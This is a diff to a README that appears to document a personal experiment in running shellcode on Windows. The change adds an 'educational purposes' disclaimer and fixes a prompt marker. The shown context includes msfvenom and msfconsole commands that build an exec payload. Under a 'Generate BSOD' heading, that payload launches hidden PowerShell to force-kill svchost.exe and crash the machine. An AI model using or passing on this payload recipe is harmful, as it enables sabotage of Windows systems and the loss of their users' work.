@@ -14,7 +14,7 @@
 
 ## Description
 
-My personal experiment on executing shellcode on Windows.
+My personal experiment on executing shellcode on Windows. For educational purposes!!!
 
 ## Kali Linux commands for generate shellcode
 
@@ -33,7 +33,7 @@ msfvenom --platform windows --arch x64 -p windows/x64/exec CMD='cmd.exe /c start
 ### Generate BSOD
 
 ```bash
-> msfconsole
+msfconsole
 > use payload/windows/x64/exec
 > set CMD cmd.exe /c start /min powershell -Command \"Start-Process cmd -ArgumentList \\\"/c taskkill /F /IM svchost.exe\\\" -WindowStyle Hidden\"
 ```
